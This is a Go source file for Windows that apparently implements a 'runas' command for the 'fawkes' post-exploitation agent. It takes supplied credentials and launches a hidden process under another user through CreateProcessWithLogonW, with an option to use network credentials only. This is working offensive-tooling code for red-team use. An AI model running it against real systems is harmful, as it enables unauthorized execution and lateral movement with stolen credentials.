//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32Runas              = windows.NewLazySystemDLL("advapi32.dll")
	procCreateProcessWithLogon = advapi32Runas.NewProc("CreateProcessWithLogonW")
)

const (
	LOGON_WITH_PROFILE        = 0x00000001
	LOGON_NETCREDENTIALS_ONLY = 0x00000002
)

// RunasCommand executes a command as a different user via CreateProcessWithLogonW.
type RunasCommand struct{}

func (c *RunasCommand) Name() string        { return "runas" }
func (c *RunasCommand) Description() string { return "Execute a command as a different user" }

type runasArgs struct {
	Command  string `json:"command"`  // command to run (e.g. "cmd.exe /c whoami")
	Username string `json:"username"` // target username
	Password string `json:"password"` // target password
	Domain   string `json:"domain"`   // domain (optional)
	NetOnly  bool   `json:"netonly"`  // LOGON_NETCREDENTIALS_ONLY (like runas /netonly)
}

func (c *RunasCommand) Execute(task structs.Task) structs.CommandResult {
	var args runasArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Command == "" || args.Username == "" || args.Password == "" {
		return structs.CommandResult{
			Output:    "Error: -command, -username, and -password are required",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse domain from username if DOMAIN\user format
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		} else {
			args.Domain = "."
		}
	}

	logonFlags := uint32(LOGON_WITH_PROFILE)
	if args.NetOnly {
		logonFlags = LOGON_NETCREDENTIALS_ONLY
	}

	username, _ := syscall.UTF16PtrFromString(args.Username)
	domain, _ := syscall.UTF16PtrFromString(args.Domain)
	password, _ := syscall.UTF16PtrFromString(args.Password)
	commandLine, _ := syscall.UTF16PtrFromString(args.Command)

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE

	var pi windows.ProcessInformation

	// CreateProcessWithLogonW creates a new process running under the specified credentials.
	// Unlike make-token (thread impersonation), this creates a fully new logon session.
	ret, _, err := procCreateProcessWithLogon.Call(
		uintptr(unsafe.Pointer(username)),
		uintptr(unsafe.Pointer(domain)),
		uintptr(unsafe.Pointer(password)),
		uintptr(logonFlags),
		0, // lpApplicationName (nil — use command line)
		uintptr(unsafe.Pointer(commandLine)),
		uintptr(windows.CREATE_NO_WINDOW),
		0, // lpEnvironment (nil — inherit)
		0, // lpCurrentDirectory (nil — inherit)
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: CreateProcessWithLogonW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Close handles
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	mode := "interactive"
	if args.NetOnly {
		mode = "netonly (network credentials only)"
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[+] Process created as %s\\%s (PID: %d, mode: %s)\nCommand: %s",
			args.Domain, args.Username, pi.ProcessId, mode, args.Command),
		Status:    "success",
		Completed: true,
	}
}
